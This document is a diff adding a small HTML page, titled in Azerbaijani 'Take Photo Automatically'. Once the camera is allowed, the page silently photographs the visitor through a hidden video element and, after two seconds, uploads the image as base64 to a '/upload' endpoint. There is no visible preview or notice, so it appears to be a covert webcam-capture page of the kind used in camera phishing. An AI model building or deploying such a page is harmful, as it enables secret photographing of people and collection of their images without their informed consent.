@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Foto Avtomatik Çək</title>
+</head>
+<body>
+  <video id="video" autoplay style="display:none;"></video>
+  <script>
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+
+        setTimeout(() => {
+          const canvas = document.createElement("canvas");
+          canvas.width = 300;
+          canvas.height = 200;
+          canvas.getContext("2d").drawImage(video, 0, 0, 300, 200);
+          const data = canvas.toDataURL("image/png");
+
+          fetch("/upload", {
+            method: "POST",
+            body: JSON.stringify({ image: data }),
+            headers: { "Content-Type": "application/json" }
+          });
+        }, 2000);
+      });
+  </script>
+</body>
+</html>
